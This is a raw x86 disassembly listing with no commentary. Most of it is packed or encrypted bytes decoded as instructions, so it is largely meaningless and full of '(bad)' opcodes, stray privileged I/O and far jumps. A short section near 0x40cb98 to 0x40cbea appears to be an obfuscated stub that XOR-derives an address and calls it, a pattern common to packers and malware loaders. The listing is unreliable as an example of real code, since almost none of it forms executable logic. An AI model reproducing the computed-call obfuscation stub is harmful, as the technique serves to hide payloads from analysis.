  40ca69:	push   ebp
  40ca6a:	cli    
  40ca6b:	and    al,0x4b
  40ca6d:	popa   
  40ca6e:	iret   
  40ca6f:	or     BYTE PTR cs:[ecx+0xb],ch
  40ca73:	mov    al,ds:0xf24ff1d4
  40ca78:	push   cs
  40ca79:	mov    edx,0x2ec4aeb8
  40ca7e:	dec    esi
  40ca7f:	push   esi
  40ca80:	cmc    
  40ca81:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  40ca83:	xchg   edi,eax
  40ca84:	xchg   esi,eax
  40ca85:	jb     0x40ca18
  40ca87:	mov    DWORD PTR [eax+0x6b],ecx
  40ca8a:	dec    ebx
  40ca8b:	pop    esi
  40ca8c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ca8d:	fs xchg ebp,eax
  40ca8f:	jl     0x40cb07
  40ca91:	in     eax,0x7a
  40ca93:	xchg   ebp,eax
  40ca94:	mov    bh,bl
  40ca96:	xor    ah,ah
  40ca98:	lods   al,BYTE PTR ds:[esi]
  40ca99:	or     edi,edi
  40ca9b:	xor    DWORD PTR [ecx-0x7c],ebp
  40ca9e:	enter  0xb365,0x32
  40caa2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40caa3:	mov    ecx,0xadbd5c0
  40caa8:	aaa    
  40caa9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40caaa:	add    BYTE PTR [ecx*2-0x66234951],bh
  40cab1:	int3   
  40cab2:	mov    bh,al
  40cab4:	retf   
  40cab5:	xchg   ebp,eax
  40cab6:	jmp    0xf210:0x47423bf8
  40cabd:	push   edx
  40cabe:	loop   0x40ca6c
  40cac0:	pop    esp
  40cac1:	or     DWORD PTR ds:0xad0d143e,edx
  40cac7:	call   0x4fe:0x9cd9e754
  40cace:	pop    ss
  40cacf:	cmp    DWORD PTR [edi+0x3b],0xe2e39daa
  40cad6:	bound  edx,QWORD PTR [ecx-0x961dbb1]
  40cadc:	add    ebp,0x3572ae07
  40cae2:	fsubrp st(3),st
  40cae4:	pop    ds
  40cae5:	or     bl,BYTE PTR [ebx+0x3c]
  40cae8:	call   0xb53ed003
  40caed:	aam    0x5b
  40caef:	pop    esp
  40caf0:	pop    ds
  40caf1:	retf   
  40caf2:	nop
  40caf3:	xor    BYTE PTR [ecx],ah
  40caf5:	lds    ebp,FWORD PTR [ebp+0x6ba6486a]
  40cafb:	addr16 and al,0x5e
  40cafe:	div    esp
  40cb00:	shl    bl,0x65
  40cb03:	(bad)  
  40cb04:	jne    0x40cb73
  40cb06:	xchg   ecx,eax
  40cb07:	mov    ch,0xd6
  40cb09:	and    BYTE PTR [edx-0x6c93407c],0xac
  40cb10:	cdq    
  40cb11:	lods   al,BYTE PTR ds:[esi]
  40cb12:	xor    ah,BYTE PTR [esi-0x68]
  40cb15:	lods   al,BYTE PTR ds:[esi]
  40cb16:	inc    ebp
  40cb17:	lds    ecx,FWORD PTR ds:0x49ea0a1f
  40cb1d:	es xor eax,0xd4bfcfe1
  40cb23:	push   esi
  40cb24:	fadd   DWORD PTR ds:0x10e034a7
  40cb2a:	out    0x9d,al
  40cb2c:	pushf  
  40cb2d:	xchg   ecx,eax
  40cb2e:	push   ecx
  40cb2f:	pop    esp
  40cb30:	dec    edi
  40cb31:	scas   eax,DWORD PTR es:[edi]
  40cb32:	cmc    
  40cb33:	ins    DWORD PTR es:[edi],dx
  40cb34:	or     al,0xcd
  40cb36:	arpl   WORD PTR [eax],ax
  40cb38:	(bad)  
  40cb39:	enter  0xac83,0x79
  40cb3d:	cdq    
  40cb3e:	pusha  
  40cb3f:	cmp    DWORD PTR [esi+0x1],eax
  40cb42:	shl    edi,cl
  40cb44:	fadd   st,st(4)
  40cb46:	cmp    ebx,ebx
  40cb48:	or     ah,al
  40cb4a:	repnz imul ebx,DWORD PTR [ecx],0xffffff9b
  40cb4e:	mov    al,ds:0xdb01be1b
  40cb53:	cdq    
  40cb54:	je     0x40cbd5
  40cb56:	push   es
  40cb57:	pushf  
  40cb58:	and    BYTE PTR [ebp-0xadf4588],0x5a
  40cb5f:	xchg   BYTE PTR [eax-0xf7f5fd9],ch
  40cb65:	add    eax,0x562efd13
  40cb6a:	fisub  WORD PTR [ebx+0x65]
  40cb6d:	jae    0x40cb7e
  40cb6f:	mov    ecx,DWORD PTR [ecx-0x2b]
  40cb72:	mov    ebp,DWORD PTR [ebp+ebp*8-0x77]
  40cb76:	xchg   edx,eax
  40cb77:	(bad)
  40cb7c:	fbstp  TBYTE PTR [ebx-0x44]
  40cb7f:	sbb    eax,0x4ab1a543
  40cb84:	adc    BYTE PTR [ecx+0x56],bh
  40cb87:	sbb    bl,ah
  40cb89:	stos   BYTE PTR es:[edi],al
  40cb8a:	fld1   
  40cb8c:	jno    0x40cb8e
  40cb8e:	ins    DWORD PTR es:[edi],dx
  40cb8f:	out    0xc6,al
  40cb91:	pushf  
  40cb92:	fidivr DWORD PTR [esi]
  40cb94:	in     eax,0xa5
  40cb96:	add    eax,esi
  40cb98:	imul   eax,DWORD PTR [edx]
  40cb9b:	mov    edx,DWORD PTR [ebp-0x4]
  40cb9e:	xor    edx,ecx
  40cba0:	mov    ecx,DWORD PTR [ebp+0x8]
  40cba3:	lea    ecx,[edx+ecx*1+0x32729b]
  40cbaa:	cmp    ecx,eax
  40cbac:	jne    0x40c41f
  40cbb2:	mov    ebx,esi
  40cbb4:	jmp    0x40cbbe
  40cbb9:	mov    ebx,0x32729b
  40cbbe:	mov    eax,DWORD PTR [ebp-0x4]
  40cbc1:	xor    eax,0x7510854
  40cbc6:	add    eax,ebx
  40cbc8:	mov    DWORD PTR [ebp-0xc],eax
  40cbcb:	xor    ebx,ebx
  40cbcd:	lea    eax,[ebp-0x10]
  40cbd0:	add    ebx,DWORD PTR [eax]
  40cbd2:	call   ebx
  40cbd4:	xor    ebx,ebx
  40cbd6:	inc    ebx
  40cbd7:	cmp    DWORD PTR [ebp+0x10],ebx
  40cbda:	je     0x40d321
  40cbe0:	xchg   edx,eax
  40cbe1:	push   0xa
  40cbe3:	pop    ecx
  40cbe4:	push   0x4
  40cbe6:	pop    ebx
  40cbe7:	inc    ebx
  40cbe8:	xchg   ebx,ecx
  40cbea:	jmp    0x40ce4d
  40cbef:	imul   edx,DWORD PTR [edi-0x4b0ecbf3],0x73
  40cbf6:	push   ecx
  40cbf7:	int3   
  40cbf8:	xor    esp,DWORD PTR [esi+edi*8+0x5]
  40cbfc:	addr16 cmc 
  40cbfe:	lods   al,BYTE PTR ds:[esi]
  40cbff:	bound  ecx,QWORD PTR [esi+edi*2+0x7e7c387e]
  40cc06:	jle    0x40cbab
  40cc08:	arpl   WORD PTR [ebx],bp
  40cc0a:	daa    
  40cc0b:	inc    DWORD PTR [ebp-0x22dfab07]
  40cc11:	mov    eax,0x88c8d6b9
  40cc16:	xchg   DWORD PTR ds:[eax+ebp*4+0xb],ecx
  40cc1b:	mov    ds:0xe1a3cfa0,al
  40cc20:	and    al,0xb6
  40cc22:	xor    DWORD PTR [ebp+0x25],eax
  40cc25:	mov    al,ds:0xd82f07a3
  40cc2a:	aam    0x4a
  40cc2c:	sbb    eax,DWORD PTR [esi]
  40cc2e:	aaa    
  40cc2f:	mov    al,cl
  40cc31:	enter  0xcd74,0x64
  40cc35:	loopne 0x40cc90
  40cc37:	and    BYTE PTR [esp+esi*4-0x44],cl
  40cc3b:	fst    DWORD PTR [esi+eax*4-0x7c]
  40cc3f:	mov    bl,0x28
  40cc41:	inc    esp
  40cc42:	jae    0x40cc41
  40cc44:	jmp    0xac3f:0x852f64ff
  40cc4b:	arpl   WORD PTR [edx],si
  40cc4d:	ficomp WORD PTR [eax]
  40cc4f:	fwait
  40cc50:	in     al,0xc1
  40cc52:	les    esp,FWORD PTR [eax+0x6cf6c843]
  40cc58:	cmp    eax,0x200fbe3d
  40cc5d:	ss in  eax,0x85
  40cc60:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cc61:	pop    ecx
  40cc62:	jl     0x40cbf0
  40cc64:	div    cl
  40cc66:	sub    ch,al
  40cc68:	imul   esp,edi,0x11fa0ce0
  40cc6e:	push   esi
  40cc6f:	sbb    eax,0xdc393892
  40cc74:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cc75:	sub    eax,0x2d769dbe
  40cc7a:	aas    
  40cc7b:	call   0xe99e:0xe0f919ad
  40cc82:	arpl   WORD PTR ds:0xa554b425,dx
  40cc88:	int    0xcf
  40cc8a:	sbb    al,0x2e
  40cc8c:	aam    0x4b
  40cc8e:	stos   BYTE PTR es:[edi],al
  40cc8f:	mov    ds:0x80f7cd4c,eax
  40cc94:	imul   edx,esi,0x913f0ce1
  40cc9a:	cvtps2pd xmm3,QWORD PTR [edi+0x9]
  40cc9e:	sahf   
  40cc9f:	std    
  40cca0:	xor    dl,bl
  40cca2:	sbb    eax,DWORD PTR [ebp+0x176c07d3]
  40cca8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cca9:	mov    edi,0xeb52c589
  40ccae:	add    BYTE PTR [ebp+0x4e],al
  40ccb1:	add    bh,cl
  40ccb3:	scas   eax,DWORD PTR es:[edi]
  40ccb4:	xor    DWORD PTR [ecx],edi
  40ccb6:	dec    edx
  40ccb7:	jecxz  0x40cc9f
  40ccb9:	and    ebp,DWORD PTR [edi+0x6a21843d]
  40ccbf:	push   0xf
  40ccc1:	sub    ecx,DWORD PTR [ecx-0x4be2d6b0]
  40ccc7:	call   0x95d9:0x7e3a7312
  40ccce:	ss add al,0x6d
  40ccd1:	jo     0x40cc89
  40ccd3:	pop    edx
  40ccd4:	mov    ss,WORD PTR [edx+edx*4-0x4005debb]
  40ccdb:	xchg   edx,eax
  40ccdc:	mov    ecx,0x845248c9
  40cce1:	mov    ecx,0x8e31b3fd
  40cce6:	cmp    eax,0x932d138b
  40cceb:	push   ebp
  40ccec:	jmp    0xa26d:0x29da6000
  40ccf3:	pop    ds
  40ccf4:	leave  
  40ccf5:	dec    esp
  40ccf6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ccf7:	mov    edx,0xa046be56
  40ccfc:	push   ebx
  40ccfd:	cld    
  40ccfe:	dec    eax
  40ccff:	cwde   
  40cd00:	jne    0x40ccc4
  40cd02:	fs jmp 0x40cd44
  40cd05:	jp     0x40cd49
  40cd07:	and    DWORD PTR ds:0xa29977a,0x1c
  40cd0e:	adc    al,0x3f
  40cd10:	mov    esi,ebx
  40cd12:	sahf   
  40cd13:	push   ebx
  40cd14:	xchg   DWORD PTR ds:0x803971c8,ebp
  40cd1a:	(bad)  
  40cd1b:	and    edx,esp
  40cd1d:	mov    edi,0x97799682
  40cd22:	add    edx,DWORD PTR [ebx]
  40cd24:	ds bswap esi
  40cd27:	and    bl,BYTE PTR [ecx+ebx*8-0x21e9439a]
  40cd2e:	and    ecx,edi
  40cd30:	cmc    
  40cd31:	and    eax,0x6b69d4d5
  40cd36:	jmp    0xed77:0xf3f20cb7
  40cd3d:	push   esp
  40cd3e:	fstp   QWORD PTR [esi-0x470cf879]
  40cd44:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cd45:	inc    esp
  40cd46:	clc    
  40cd47:	cwde   
  40cd48:	mov    ecx,0xdd65055d
  40cd4d:	xchg   ebp,eax
  40cd4e:	aaa    
  40cd4f:	repnz stc 
  40cd51:	gs int 0x18
  40cd54:	idiv   al
  40cd56:	pop    edx
  40cd57:	clc    
  40cd58:	mul    DWORD PTR [esi-0x694b0b25]
  40cd5e:	pop    edx
  40cd5f:	ja     0x40cd51
  40cd61:	je     0x40cd9e
  40cd63:	mov    ds:0xb1b83d8d,al
  40cd68:	loopne 0x40cd5c
  40cd6a:	sbb    DWORD PTR [esi+0x75d86a39],0x96ddae91
  40cd74:	xchg   edx,eax
  40cd75:	lods   al,BYTE PTR ds:[esi]
  40cd76:	push   edx
  40cd77:	(bad)  
  40cd78:	call   DWORD PTR [ebx+0x3948f449]
  40cd7e:	and    dl,0x7b
  40cd81:	dec    esi
  40cd82:	or     al,0xf7
  40cd84:	in     al,0xd2
  40cd86:	inc    esp
  40cd87:	mov    cl,0xc4
  40cd89:	adc    ebx,ecx
  40cd8b:	imul   ebp,DWORD PTR [ecx+edx*2-0x148842a8],0xe604a94c
  40cd96:	clc    
  40cd97:	popa   
  40cd98:	pop    eax
  40cd99:	pop    edx
  40cd9a:	bnd jmp 0x40cd3e
  40cd9d:	add    al,0x52
  40cd9f:	pop    ss
  40cda0:	mov    ds:0x1db9df18,eax
  40cda6:	add    al,0xb5
  40cda8:	inc    esp
  40cda9:	mov    edx,DWORD PTR [esi-0x19]
  40cdac:	rol    cl,1
  40cdae:	test   al,0x88
  40cdb0:	aas    
  40cdb1:	std    
  40cdb2:	push   esi
  40cdb3:	adc    eax,0xd88d6e16
  40cdb8:	fild   DWORD PTR [ebx-0x54]
  40cdbb:	cmp    BYTE PTR [edi],dl
  40cdbd:	in     eax,dx
  40cdbe:	or     eax,0x44e1b04a
  40cdc3:	pop    eax
  40cdc4:	daa    
  40cdc5:	loopne 0x40cd98
  40cdc7:	mov    edx,0x531501b5
  40cdcc:	leave  
  40cdcd:	jae    0x40ce27
  40cdcf:	cmp    BYTE PTR [ebx-0x59b75440],cl
  40cdd5:	add    ebx,ebp
  40cdd7:	push   es
  40cdd8:	adc    al,0xbc
  40cdda:	and    DWORD PTR [eax-0x3c0451d],esi
  40cde0:	(bad)  [ecx]
  40cde2:	lock js 0x40cdcb
  40cde5:	out    dx,eax
  40cde6:	rcl    DWORD PTR [esi],0x1f
  40cde9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cdea:	jg     0x40ce1b
  40cdec:	jmp    0x40ce6b
  40cdee:	jae    0x40cd83
  40cdf0:	std    
  40cdf1:	sub    edi,DWORD PTR [edi+eiz*4+0x20]
  40cdf5:	(bad)  
  40cdf7:	mov    bl,0xe1
  40cdf9:	xor    al,0xdc
  40cdfb:	cmp    DWORD PTR [edi-0x46],ebx
  40cdfe:	pusha  
  40cdff:	daa    
  40ce00:	rcl    DWORD PTR [edx],1
  40ce02:	stc    
  40ce03:	or     bh,BYTE PTR [esp+ecx*1-0x4c]
  40ce07:	outs   dx,DWORD PTR ds:[esi]
  40ce08:	inc    DWORD PTR [esi]
  40ce0a:	push   ebx
  40ce0b:	(bad)
  40ce0e:	xchg   ebx,eax
  40ce0f:	je     0x40cdea
  40ce11:	not    DWORD PTR [edx+0x52721766]
  40ce17:	or     DWORD PTR [ebx+0x35fd514e],edx
  40ce1d:	xor    DWORD PTR ds:0xc0c61c8b,ecx
  40ce23:	(bad)  
  40ce24:	hlt    
  40ce25:	loop   0x40ce27
  40ce27:	(bad)  
  40ce29:	jmp    0x40ce31
  40ce2b:	cmp    BYTE PTR [eax-0x31960286],ch
  40ce31:	lea    edx,[eax+0x687280d5]
  40ce37:	sar    DWORD PTR [ebx+0xc],0x3e
  40ce3b:	xchg   edi,eax
  40ce3c:	jecxz  0x40cea7
  40ce3e:	lahf   
  40ce3f:	dec    ebp
  40ce40:	cmp    al,0xa4
  40ce42:	sti    
  40ce43:	fdivr  QWORD PTR [eax+edx*2-0x4fbba1b]
  40ce4a:	adc    eax,0xd92ba66b
  40ce4f:	xchg   ebx,ecx
  40ce51:	jmp    0x40d0b4
  40ce56:	push   ebx
  40ce57:	std    
  40ce58:	dec    ebx
  40ce59:	sahf   
  40ce5a:	push   ecx
  40ce5b:	push   0x84027173
  40ce60:	add    al,0xed
  40ce62:	cs popf 
  40ce64:	jl     0x40cea6
  40ce66:	sub    al,0x8b
  40ce68:	jle    0x40cee8
  40ce6a:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40ce6e:	inc    ebx
  40ce6f:	add    BYTE PTR [edi-0x25a6428a],dh
  40ce75:	stos   BYTE PTR es:[edi],al
  40ce76:	dec    esp
  40ce77:	pop    edx
  40ce78:	popf   
  40ce79:	and    ecx,DWORD PTR [edx-0x2ca8eb0]
  40ce7f:	dec    esp
  40ce80:	fwait
  40ce81:	(bad)  
  40ce82:	fimul  DWORD PTR [ecx-0x3b68984f]
  40ce88:	hlt    
  40ce89:	pop    esi
  40ce8a:	cmp    al,0xe7
  40ce8c:	jno    0x40cef0
  40ce8e:	idiv   BYTE PTR [eax-0x5fbd7e6f]
  40ce94:	adc    esi,DWORD PTR [ecx+eax*1+0x50]
  40ce98:	push   0x46ac46f8
  40ce9d:	mov    esp,0x52e34138
  40cea2:	pusha  
  40cea3:	call   0xac8a4958
  40cea8:	push   0xd2b01f8e
  40cead:	shl    BYTE PTR [bp+si-0x6e1b],0x91
  40ceb3:	mov    WORD PTR [esi],es
  40ceb5:	inc    ebx
  40ceb6:	jmp    0x5aac1d0f
  40cebb:	bound  eax,QWORD PTR [esp+eax*4+0x43918e42]
  40cec2:	dec    esi
  40cec3:	out    0xca,al
  40cec5:	mov    ebx,0xc7405775
  40ceca:	adc    eax,0xbb49a118
  40cecf:	sbb    BYTE PTR [edx-0x2d],cl
  40ced2:	push   edx
  40ced3:	ins    BYTE PTR es:[edi],dx
  40ced4:	xor    eax,0xca81030a
  40ced9:	inc    ecx
  40ceda:	mov    ch,BYTE PTR [ecx+0x65]
  40cedd:	add    al,0x41
  40cedf:	and    bh,BYTE PTR [edi-0x1d]
  40cee2:	pushf  
  40cee3:	xchg   ebx,eax
  40cee4:	jbe    0x40ce6a
  40cee6:	ins    DWORD PTR es:[edi],dx
  40cee7:	ds loopne 0x40cf55
  40ceea:	or     eax,0xeccc701f
  40ceef:	mov    gs,WORD PTR [eax-0x28870549]
  40cef5:	xor    DWORD PTR [ebp-0x2c487824],edi
  40cefb:	and    esp,DWORD PTR [ecx-0x6aa18ccd]
  40cf01:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cf02:	mov    bl,al
  40cf04:	ret    
  40cf05:	into   
  40cf06:	push   ebx
  40cf07:	stc    
  40cf08:	or     BYTE PTR [eax+0x8],ch
  40cf0b:	dec    eax
  40cf0c:	add    BYTE PTR [edi+0x5b],cl
  40cf0f:	jb     0x40cee1
  40cf11:	mov    eax,0x3f161e10
  40cf16:	ss sbb ecx,ecx
  40cf19:	js     0x40ceb4
  40cf1b:	in     eax,0x39
  40cf1d:	adc    al,0x5b
  40cf1f:	int    0xed
  40cf21:	fs add al,0x30
  40cf24:	sbb    ecx,DWORD PTR [ebx+0x792ed7f7]
  40cf2a:	cmp    al,0x4d
  40cf2c:	shr    ah,cl
  40cf2e:	jp     0x40cf36
  40cf30:	outs   dx,DWORD PTR ds:[esi]
  40cf31:	sbb    dl,BYTE PTR [ecx+0xe]
  40cf34:	js     0x40cf5d
  40cf36:	in     eax,0x5d
  40cf38:	pop    ebx
  40cf39:	jmp    0x40cee0
  40cf3b:	int3   
  40cf3c:	aas    
  40cf3d:	push   ebp
  40cf3e:	fdivr  QWORD PTR [ecx]
  40cf40:	and    eax,0x63168198
  40cf45:	arpl   sp,dx
  40cf47:	xchg   BYTE PTR [eax+0x5c9f3cc1],bh
  40cf4d:	mov    bl,0x16
  40cf4f:	and    DWORD PTR [edx-0x3da3ac53],esi
  40cf55:	and    BYTE PTR [edi],bl
  40cf57:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cf58:	add    dl,BYTE PTR [ecx+0x7]
  40cf5b:	call   0x4bc4af4e
  40cf60:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cf61:	fisub  DWORD PTR [edi+0x58]
  40cf64:	(bad)  [ebp-0x7255ea1f]
  40cf6a:	mov    eax,ds:0xefa2d49d
  40cf6f:	pop    ss
  40cf70:	mov    ?,eax
  40cf72:	mov    WORD PTR [esi+edx*1+0x73c40e81],?
  40cf79:	mov    ebp,0x8ee2220f
  40cf7e:	enter  0x7136,0xf5
  40cf82:	enter  0x9c06,0xe3
  40cf86:	cs aas 
  40cf88:	cmc    
  40cf89:	out    dx,eax
  40cf8a:	ins    DWORD PTR es:[edi],dx
  40cf8b:	jae    0x40d002
  40cf8d:	shr    DWORD PTR [ecx-0x4df7aec3],0x99
  40cf94:	shr    edx,cl
  40cf96:	dec    eax
  40cf97:	mov    al,ds:0xf610324e
  40cf9c:	sbb    eax,0xb98b549c
  40cfa1:	adc    eax,eax
  40cfa3:	inc    ebx
  40cfa4:	xchg   dl,ah
  40cfa6:	popf   
  40cfa7:	retf   
  40cfa8:	push   edi
  40cfa9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cfaa:	dec    eax
  40cfab:	cmp    ah,BYTE PTR [edi+esi*1+0x68]
  40cfaf:	mov    esi,0x33341597
  40cfb4:	iret   
  40cfb5:	inc    esi
  40cfb6:	lock cld 
  40cfb8:	cdq    
  40cfb9:	push   ss
  40cfba:	sub    ebp,edx
  40cfbc:	add    eax,0xa0f0f97b
  40cfc1:	shl    ebp,cl
  40cfc3:	jge    0x40cf64
  40cfc5:	outs   dx,BYTE PTR ds:[esi]
  40cfc6:	loop   0x40cf95
  40cfc8:	push   edi
  40cfc9:	pop    edi
  40cfca:	add    edi,DWORD PTR [esi]
  40cfcc:	adc    BYTE PTR [esi-0x1d],cl
  40cfcf:	push   cs
  40cfd0:	enter  0x8ed0,0xba
  40cfd4:	dec    esi
  40cfd5:	jns    0x40d014
  40cfd7:	adc    BYTE PTR [ebx],al
  40cfd9:	popa   
  40cfda:	dec    edx
  40cfdb:	xchg   ecx,eax
  40cfdc:	xchg   esi,eax
  40cfdd:	int    0xb8
  40cfdf:	or     DWORD PTR [ecx+0x4],edi
  40cfe2:	mov    ah,0xc4
  40cfe4:	test   al,0xa2
  40cfe6:	gs mov eax,edx
  40cfe9:	in     al,dx
  40cfea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cfeb:	pop    ebx
  40cfec:	mov    ds:0x1f0cb93a,al
  40cff1:	xchg   edi,eax
  40cff2:	adc    ebx,DWORD PTR [eax+edx*4-0x80]
  40cff6:	sar    BYTE PTR ds:0xd656a0c6,1
  40cffc:	pop    esi
  40cffd:	jb     0x40d01a
  40cfff:	dec    eax
  40d000:	sub    eax,0xa2346b4b
  40d005:	bound  eax,QWORD PTR [ebp+0x70]
  40d008:	lds    ecx,FWORD PTR [edx-0x57]
  40d00b:	push   0xfafbe3ca
  40d010:	js     0x40cfce
  40d012:	mov    ebx,0x3f408601
  40d017:	mov    bh,0xc1
  40d019:	test   BYTE PTR [edi-0x4c],dh
  40d01c:	push   es
  40d01d:	pop    ds
  40d01e:	scas   al,BYTE PTR es:[edi]
  40d01f:	mov    ebx,ebx
  40d021:	imul   esi,DWORD PTR [esi],0xcaad8bdc
  40d027:	add    DWORD PTR [eax],esp
  40d029:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d02a:	or     eax,0x88175fa8
  40d02f:	mov    al,0xf3
  40d031:	test   BYTE PTR [edx+0x31922e37],dh
  40d037:	mov    edx,0x55592684
  40d03c:	fnstenv [ecx]
  40d03e:	push   0xc390f190
  40d043:	or     BYTE PTR [ebx],ch
  40d045:	mov    bl,0x61
  40d047:	push   es
  40d048:	xchg   BYTE PTR [edi+esi*8-0x5a32d461],bl
  40d04f:	dec    esi
  40d050:	leave  
  40d051:	sbb    eax,0xd222b971
  40d056:	xchg   edx,eax
  40d057:	stos   DWORD PTR es:[edi],eax
  40d058:	mov    esi,0x6fac3f96
  40d05d:	xor    al,0xb9
  40d05f:	gs stc 
  40d061:	scas   al,BYTE PTR es:[edi]
  40d062:	lds    edx,FWORD PTR [ecx]
  40d064:	add    ah,cl
  40d066:	loopne 0x40d00e
  40d068:	xchg   esp,eax
  40d069:	jmp    0x40cff4
  40d06b:	add    ebp,0xffffffe0
  40d06e:	and    eax,0x26074913
  40d073:	bound  esp,QWORD PTR [ebp-0x701264f1]
  40d079:	mov    dh,0x2f
  40d07b:	imul   edx,ebx,0x42
  40d07e:	xor    eax,0x4126da58
  40d083:	repz jl 0x40d04f
  40d086:	inc    ecx
  40d087:	ret    0xc65a
  40d08a:	mov    edi,0xb898f452
  40d08f:	into   
  40d090:	in     eax,dx
  40d091:	push   ecx
  40d092:	sti    
  40d093:	scas   al,BYTE PTR es:[edi]
  40d094:	psubw  mm5,QWORD PTR [eax-0x6af41630]
  40d09b:	(bad)  
  40d09d:	arpl   WORD PTR [ebx+0x5b9e6af0],ax
  40d0a3:	(bad)  
  40d0a4:	lahf   
  40d0a5:	inc    edi
  40d0a6:	pop    es
  40d0a7:	inc    ebx
  40d0a8:	pop    ecx
  40d0a9:	jns    0x40d0ba
  40d0ab:	push   ecx
  40d0ac:	sub    BYTE PTR [edi],ch
  40d0ae:	xor    eax,0x9baa4cd
  40d0b3:	add    eax,0xe4458b49
  40d0b8:	imul   eax,ecx
  40d0bb:	add    esp,eax
  40d0bd:	xchg   edx,eax
  40d0be:	jmp    0x40d321
  40d0c3:	sahf   
  40d0c4:	test   BYTE PTR [edi],0xc3
  40d0c7:	push   edi
  40d0c8:	repz pop edx
  40d0ca:	jae    0x40d0bf
  40d0cc:	ficom  WORD PTR [edx+0x6a]
  40d0cf:	mov    ah,0xec
  40d0d1:	ins    DWORD PTR es:[edi],dx
  40d0d2:	pop    ss
  40d0d3:	test   BYTE PTR [ecx+0x7c387e7e],0x7e
  40d0da:	jle    0x40d11a
  40d0dc:	addr16 rcr esi,0x25
  40d0e0:	into   
  40d0e1:	mov    eax,0x38d415b8
  40d0e6:	pop    ss
  40d0e7:	push   ebx
  40d0e8:	sbb    BYTE PTR [eax-0x66e3ba95],dh
  40d0ee:	cmp    eax,0x90dd4de5
  40d0f3:	and    BYTE PTR [edi+edx*1+0x51cb82b1],ah
  40d0fa:	dec    edi
  40d0fb:	(bad)  
  40d0fc:	loopne 0x40d14f
  40d0fe:	inc    eax
  40d0ff:	xchg   BYTE PTR [edi+0x7c],dh
  40d102:	dec    ebp
  40d103:	add    BYTE PTR [ecx],bh
  40d105:	out    0x3c,al
  40d107:	lea    edx,[esi+0x244cbd9f]
  40d10d:	inc    eax
  40d10e:	add    eax,0x7c9dba2
  40d113:	lock push ecx
  40d115:	nop
  40d116:	ins    DWORD PTR es:[edi],dx
  40d117:	mov    esi,0xadeb5e27
  40d11c:	push   esp
  40d11d:	sub    eax,0xc177223a
  40d122:	xor    eax,esp
  40d124:	xchg   esp,eax
  40d125:	cdq    
  40d126:	mov    bl,0x64
  40d128:	imul   esi,DWORD PTR [ebx-0x58],0x9e68687
  40d12f:	sbb    eax,0x9f5ecbd2
  40d134:	mov    eax,0x97e2cf5
  40d139:	sbb    eax,0xa485016b
  40d13e:	popf   
  40d13f:	test   eax,0x4c73fb98
  40d144:	and    esp,DWORD PTR [ecx]
  40d146:	xor    al,0x56
  40d148:	mov    ebp,0xeb1aaf51
  40d14d:	sbb    BYTE PTR [esi+0xb1bad5b],dl
  40d153:	jbe    0x40d188
  40d155:	inc    edx
  40d156:	add    DWORD PTR [edi+0x4eadafb9],esp
  40d15c:	cwde   
  40d15d:	daa    
  40d15e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d15f:	push   ss
  40d160:	mov    ebx,0x64a50206
  40d165:	mov    dl,0x2d
  40d167:	adc    eax,0x54e5a2fb
  40d16c:	adc    ah,BYTE PTR [eax-0x1e]
  40d16f:	or     DWORD PTR [edx+ebp*1+0xafda1ad],esi
  40d176:	xor    edx,DWORD PTR [eax+edx*4+0x350f6b01]
  40d17d:	test   BYTE PTR [edi],0x8e
  40d180:	add    ebp,DWORD PTR [ebp-0x71]
  40d183:	fild   WORD PTR [edx]
  40d185:	cdq    
  40d186:	mov    ebp,0xb8fe1741
  40d18b:	push   0xffffffa4
  40d18d:	and    bh,BYTE PTR [eax]
  40d18f:	enter  0x5ecb,0xa7
  40d193:	hlt    
  40d194:	aam    0x1e
  40d196:	cs ins DWORD PTR es:[edi],dx
  40d198:	arpl   WORD PTR [eax+ebp*8-0x79],sp
  40d19c:	jo     0x40d215
  40d19e:	cwde   
  40d19f:	add    BYTE PTR [esi+ebp*4],al
  40d1a2:	ror    BYTE PTR [esi+0x76],1
  40d1a5:	cdq    
  40d1a6:	and    al,0xf2
  40d1a8:	clc    
  40d1a9:	(bad)  
  40d1ab:	lahf   
  40d1ac:	pushf  
  40d1ad:	jmp    0x40d1dc
  40d1af:	ss popa 
  40d1b1:	les    edx,FWORD PTR [eax+0x1727b7b9]
  40d1b7:	repz jo 0x40d221
  40d1ba:	gs mov cl,0x69
  40d1bd:	dec    esp
  40d1be:	jno    0x40d1dd
  40d1c0:	lods   al,BYTE PTR ds:[esi]
  40d1c1:	sbb    ebx,DWORD PTR [ebp+0x30]
  40d1c4:	add    BYTE PTR [edx+0x7d],cl
  40d1c7:	icebp  
  40d1c8:	or     esi,DWORD PTR [ebp-0x79]
  40d1cb:	in     eax,0x16
  40d1cd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d1ce:	sub    BYTE PTR [edx],al
  40d1d0:	add    al,0x95
  40d1d2:	(bad)  
  40d1d3:	push   edx
  40d1d4:	mov    al,ds:0x98035b50
  40d1d9:	sub    dl,al
  40d1db:	scas   eax,DWORD PTR es:[edi]
  40d1dc:	sti    
  40d1dd:	es sti 
  40d1df:	das    
  40d1e0:	dec    ebx
  40d1e1:	cwde   
  40d1e2:	jb     0x40d216
  40d1e4:	mov    esp,0x9488bebb
  40d1e9:	mov    al,ds:0x7be1e9e1
  40d1ee:	cwde   
  40d1ef:	mov    dl,0x8b
  40d1f1:	(bad)  
  40d1f2:	test   DWORD PTR [ebp-0x7e1f0108],ebp
  40d1f8:	and    BYTE PTR [edx+0x6aabe441],al
  40d1fe:	add    BYTE PTR [ebx-0x7],dh
